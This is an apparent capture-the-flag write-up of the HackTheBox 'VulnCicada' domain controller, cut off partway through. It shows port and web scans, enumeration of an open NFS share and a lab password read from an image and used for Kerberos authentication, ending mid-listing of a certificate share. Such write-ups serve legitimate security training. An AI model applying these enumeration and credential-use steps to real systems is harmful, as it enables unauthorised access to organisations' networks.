---
title: HTB: VulnCicada
url: https://0xdf.gitlab.io/2025/07/03/htb-vulncicada.html
date: 2025-07-03T09:00:00+00:00
difficulty: Medium [30]
os: Windows
tags: ctf, hackthebox, htb-vulncicada, vulnlab, nmap, windows, active-directory, feroxbuster, netexec, nfs, certenroll, adcs, certipy, esc8, certipy-relay, netexec-coerce-plus, petitpotam, secretsdump, wmiexec
---

![VulnCicada](/img/vulncicada-cover.png)

I’ll find an open NFS share on VulnCicada, and exfil two images. One of them has a password on a sticknote, which I’ll use to get authenticated to the domain. From there, I’ll enumerate ADCS and find the DC vulnerable to ESC8. I’ll show how to do this attack from Linux, creating a malicious DNS record that points the DC back to my host, abusing a serialized empty string. Then I’ll use PetitPotam to coerce the DC to authenticate to me, where I’ll use certipy relay to get a TGT as the machine account. I’ll use that account to dump hashes for the domain, and get a shell as administrator.

## Box Info

| Name | [VulnCicada](https://hackthebox.com/machines/vulncicada)  [VulnCicada](https://hackthebox.com/machines/vulncicada) [Play on HackTheBox](https://hackthebox.com/machines/vulncicada) |
| --- | --- |
| Release Date | 03 Jul 2025 |
| Retire Date | 03 Jul 2025 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [xct xct](https://app.hackthebox.com/users/13569) |

## Recon

### Initial Scanning

`nmap` finds 25 open TCP ports:

```

oxdf@hacky$ nmap -p- -vvv --min-rate 10000 10.129.234.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 20:24 UTC
...[snip]...
Nmap scan report for 10.129.234.48
Host is up, received echo-reply ttl 127 (0.090s latency).
Scanned at 2025-06-16 20:24:16 UTC for 14s
Not shown: 65510 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
111/tcp   open  rpcbind          syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2049/tcp  open  nfs              syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5357/tcp  open  wsdapi           syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
61842/tcp open  unknown          syn-ack ttl 127
61843/tcp open  unknown          syn-ack ttl 127
61867/tcp open  unknown          syn-ack ttl 127
61929/tcp open  unknown          syn-ack ttl 127
62457/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds
           Raw packets sent: 131052 (5.766MB) | Rcvd: 29 (1.260KB)
oxdf@hacky$ nmap -p 53,80,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,5357,5985,9389 -sCV 10.129.234.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 20:26 UTC
Nmap scan report for 10.129.234.48
Host is up (0.090s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-16 20:38:43Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2024-09-13T10:42:50
|_Not valid after:  2025-09-13T10:42:50
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2024-09-13T10:42:50
|_Not valid after:  2025-09-13T10:42:50
2049/tcp open  mountd        1-3 (RPC #100005)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2024-09-13T10:42:50
|_Not valid after:  2025-09-13T10:42:50
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2024-09-13T10:42:50
|_Not valid after:  2025-09-13T10:42:50
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2025-04-09T08:36:14
|_Not valid after:  2025-10-09T08:36:14
|_ssl-date: 2025-06-16T20:40:10+00:00; +12m30s from scanner time.
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-06-16T20:39:31
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 12m29s, deviation: 0s, median: 12m29s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 148.25 seconds

```

The box shows many of the ports associated with a [Windows Domain Controller](/cheatsheets/os#windows-domain-controller). The domain is `cicada.vl`, and the hostname is `DC-JPQ225`.

I’ll use `netexec` to generate a hosts file and add it to the top of mine:

```

oxdf@hacky$ netexec smb 10.129.234.48 --generate-hosts-file hosts
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
oxdf@hacky$ cat hosts 
10.129.234.48     DC-JPQ225.cicada.vl cicada.vl DC-JPQ225
oxdf@hacky$ cat hosts /etc/hosts | sponge /etc/hosts

```

### Website - TCP 80

#### Site

The website is the default IIS page:

![image-20250616163115156](/img/image-20250616163115156.png)

#### Tech Stack

The HTTP response headers show nothing interesting:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Fri, 13 Sep 2024 15:17:21 GMT
Accept-Ranges: bytes
ETag: "fdd9857f05db1:0"
Server: Microsoft-IIS/10.0
Date: Mon, 16 Jun 2025 20:46:25 GMT
Content-Length: 703

```

The main page loads as `iisstart.htm`, which is a typically name for that file.

The 404 page is the [default IIS 404](/cheatsheets/404#iis):

![image-20250616163145036](/img/image-20250616163145036.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, using a lowercase wordlist as IIS is not typically case sensitive:

```

oxdf@hacky$ feroxbuster -u http://10.129.234.48 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.234.48
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      334l     2089w   180418c http://10.129.234.48/iisstart.png
200      GET       32l       55w      703c http://10.129.234.48/
400      GET        6l       26w      324c http://10.129.234.48/error%1F_log
[####################] - 50s    26587/26587   0s      found:3       errors:0
[####################] - 49s    26584/26584   547/s   http://10.129.234.48/    

```

Nothing here.

### SMB - TCP 445

`netexec` shows the same domain and hostname information as `nmap`, and that NTLM auth is disabled:

```

oxdf@hacky$ netexec smb DC-JPQ225.cicada.vl -u guest -p ''
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\guest: STATUS_NOT_SUPPORTED 

```

I’m not able to authenticate using Kerberos using a dummy or guest name:

```

oxdf@hacky$ netexec smb DC-JPQ225.cicada.vl -u guest -p '' -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\guest: KDC_ERR_CLIENT_REVOKED
oxdf@hacky$ netexec smb DC-JPQ225.cicada.vl -u oxdf -p '' -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\oxdf: KDC_ERR_C_PRINCIPAL_UNKNOWN 

```

### NFS - 2049

There is a public NFS share on VulnCicada:

```

oxdf@hacky$ showmount -e 10.129.234.48
Export list for 10.129.234.48:
/profiles (everyone)

```

I’ll mount the share to `/mnt` on my local box:

```

oxdf@hacky$ sudo mount -t nfs -o rw 10.129.234.48:/profiles /mnt
oxdf@hacky$ ls /mnt
Administrator    Debra.Wright  Jordan.Francis  Katie.Ward     Richard.Gibbons  Shirley.West
Daniel.Marshall  Jane.Carter   Joyce.Andrews   Megan.Simpson  Rosie.Powell

```

It looks like it’s probably the `C:\Users` directory.

The public user has access to all of these directories except for two (though most are empty):

```

oxdf@hacky$ find /mnt  -ls
1407374883623611      4 drwxrwxrwx   2 nobody   nogroup      4096 Jun  3 10:21 /mnt
2533274790396733      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 15  2024 /mnt/Administrator
1688849860264767      1 drwx------   2 nobody   nogroup        64 Sep 15  2024 /mnt/Administrator/Documents
find: ‘/mnt/Administrator/Documents’: Permission denied
1688849860264783   1456 -rwxrwxrwx   1 nobody   nogroup   1490573 Sep 13  2024 /mnt/Administrator/vacation.png
 844424930132659      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Daniel.Marshall
 844424930132661      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Debra.Wright
1125899906843319      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Jane.Carter
 844424930132665      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Jordan.Francis
 844424930132667      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Joyce.Andrews
 844424930132669      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Katie.Ward
1125899906843329      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Megan.Simpson
 844424930132675      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Richard.Gibbons
 562949953422027      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 15  2024 /mnt/Rosie.Powell
5066549580792907      1 drwx------   2 nobody   nogroup        64 Sep 15  2024 /mnt/Rosie.Powell/Documents
find: ‘/mnt/Rosie.Powell/Documents’: Permission denied
2251799813708883   1792 -rwx------   1 nobody   nogroup   1832505 Sep 13  2024 /mnt/Rosie.Powell/marketing.png
 562949953422029      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Shirley.West
oxdf@hacky$ find /mnt -type f -ls
find: ‘/mnt/Administrator/Documents’: Permission denied
1688849860264783   1456 -rwxrwxrwx   1 nobody   nogroup   1490573 Sep 13  2024 /mnt/Administrator/vacation.png
find: ‘/mnt/Rosie.Powell/Documents’: Permission denied
2251799813708883   1792 -rwx------   1 nobody   nogroup   1832505 Sep 13  2024 /mnt/Rosie.Powell/marketing.png

```

I’ll copy the two images I can access to my host:

```

oxdf@hacky$ cp /mnt/Administrator/vacation.png .
oxdf@hacky$ cp /mnt/Rosie.Powell/marketing.png .
cp: cannot open '/mnt/Rosie.Powell/marketing.png' for reading: Permission denied
oxdf@hacky$ sudo cp /mnt/Rosie.Powell/marketing.png .

```

I have to use `sudo` for the second due to the permissions. `vacation.png` is a guy with a laptop in a parachute:

![](/img/vulncicada-vacation.png)

`marketing.png` is a woman at a desk:

![](/img/vulncicada-marketing.png)

That looks like a password on a stickynote.

## Auth as DC-JPQ225

### Authenticated SMB

#### Auth POC

The creds work for Rosie.Powell over SMB using Kerberos:

```

oxdf@hacky$ netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 

```

#### Listing Shares

The box has the standard DC shares, as well as two additional:

```

oxdf@hacky$ netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Share           Permissions     Remark
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -----           -----------     ------
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        ADMIN$                          Remote Admin
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        C$                              Default share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        IPC$            READ            Remote IPC
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ            Logon server share 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE      
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share

```

`CertEnroll` is related to ADCS (both by name and by the comment with the share). `profiles` doesn’t have a label (though based on the name it may be home directories).

#### Share Enumeration

I’ll get a TGT as Rosie.Powell using `netexec`:

```

oxdf@hacky$ netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --generate-tgt Rosie
.Powell
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM
:False)   
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] TGT saved to: Rosie.Powell.ccache
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] Run the following command to use the TGT: export KRB5CCNAME=Rosie.Powell.cc
ache  

```

I’ll use it to connect to SMB:

```

oxdf@hacky$ KRB5CCNAME=Rosie.Powell.ccache smbclient.py -k DC-JPQ225.cicada.vl
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
CertEnroll
IPC$
NETLOGON
profiles$
SYSVOL

```

`profiles$` is the same as the NFS share. `CertEnroll` has a bunch of certificates:

```

# use CertEnroll
# ls
drw-rw-rw-          0  Mon Jun 16 20:41:25 2025 .
drw-rw-rw-          0  Fri Sep 13 15:17:59 2024 ..
-rw-rw-rw-        741  Mon Jun 16 20:36:08 2025 cicada-DC-JPQ225-CA(1)+.crl
-rw-rw-rw-        941  Mon Jun 16 20:36:08 2025 cicada-DC-JPQ225-CA(1).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(10)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(10).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(11)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(11).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(12)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(12).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(13)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(13).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(14)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(14).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(15)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(15).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(16)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(16).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(17)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(17).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(18)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(18).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(19)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(19).crl
-rw-rw-rw-        741  Mon Jun 16 20:36:08 2025 cicada-DC-JPQ225-CA(2)+.crl
-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(2).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(20)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(20).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(21)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(21).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(22)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(22).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(23)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(23).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(24)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(24).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(25)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(25).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(26)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(26).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(27)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(27).crl
-rw-rw-rw-        742  Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(28)+.crl
-rw-rw-rw-        943  Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(28).crl
-rw-rw-rw-        741  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(3)+.crl
-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(3).crl
-rw-rw-rw-        741  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(4)+.crl
-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(4).crl
-rw-rw-rw-        741  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(5)+.crl
-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(5).crl
-rw-rw-rw-        741  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(6)+.crl
-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(6).crl
-rw-rw-rw-        741  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(7)+.crl
-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(7).crl
-rw-rw-rw-        741  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(8)+.crl
-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(8).crl
-rw-rw-rw-        741  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(9)+.crl
-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(9).crl
-rw-rw-rw-        736  Mon Jun 16 20:36:08 2025 cicada-DC-JPQ225-CA+.crl
-rw-rw-rw-        933  Mon Jun 16 20:36:08 2025 cicada-DC-JPQ225-CA.crl
-rw-rw-rw-       1385  Sun Sep 15 13:18:43 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(0-1).crt
-rw-rw-rw-        924  Sun Sep 15 07:51:18 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1).crt
-rw-rw-rw-       1390  Sun Sep 15 13:18:43 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1-0).crt
-rw-rw-rw-       1390  Sun Sep 15 13:18:43 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1-2).crt
-rw-rw-rw-        924  Thu Apr 10 08:44:43 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10).crt
-rw-rw-rw-       1391  Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10-11).crt
-rw-rw-rw-       1391  Thu Apr 10 08:57:00 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10-9).crt
-rw-rw-rw-        924  Thu Apr 10 08:58:25 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11).crt
-rw-rw-rw-       1391  Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11-10).crt
-rw-rw-rw-       1391  Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11-12).crt
-rw-rw-rw-        924  Thu Apr 10 09:00:22 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12).crt
-rw-rw-rw-       1391  Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12-11).crt
-rw-rw-rw-       1391  Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12-13).crt
-rw-rw-rw-        924  Thu Apr 10 09:03:13 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13).crt
-rw-rw-rw-       1391  Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13-12).crt
-rw-rw-rw-       1391  Tue Jun  3 10:21:47 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13-14).crt
-rw-rw-rw-        924  Fri Apr 11 05:49:41 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14).crt
-rw-rw-rw-       1391  Tue Jun  3 10:22:11 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14-13).crt
-rw-rw-rw-       1391  Tue Jun  3 10:22:11 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14-15).crt
-rw-rw-rw-        924  Fri Apr 11 05:51:40 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15).crt
-rw-rw-rw-       1391  Tue Jun  3 10:22:11 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15-14).crt
-rw-rw-rw-       1391  Tue Jun  3 10:22:12 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15-16).crt
-rw-rw-rw-        924  Fri Apr 11 05:53:40 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16).crt
-rw-rw-rw-       1391  Tue Jun  3 10:22:12 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16-15).crt
-rw-rw-rw-       1391  Wed Jun  4 12:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16-17).crt
-rw-rw-rw-        924  Tue Jun  3 10:23:15 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17).crt
-rw-rw-rw-       1391  Wed Jun  4 12:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17-16).crt
-rw-rw-rw-       1391  Wed Jun  4 12:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17-18).crt
-rw-rw-rw-        924  Tue Jun  3 10:24:51 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18).crt
-rw-rw-rw-       1391  Wed Jun  4 12:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18-17).crt
-rw-rw-rw-       1391  Wed Jun  4 12:51:27 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18-19).crt
-rw-rw-rw-        924  Tue Jun  3 10:26:51 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19).crt
-rw-rw-rw-       1391  Wed Jun  4 12:51:27 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19-18).crt
-rw-rw-rw-       1391  Wed Jun  4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19-20).crt
-rw-rw-rw-        924  Sun Sep 15 07:53:03 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2).crt
-rw-rw-rw-       1390  Sun Sep 15 13:18:44 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2-1).crt
-rw-rw-rw-       1390  Sun Sep 29 09:41:29 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2-3).crt
-rw-rw-rw-        924  Wed Jun  4 12:52:43 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20).crt
-rw-rw-rw-       1391  Wed Jun  4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20-19).crt
-rw-rw-rw-       1391  Wed Jun  4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20-21).crt
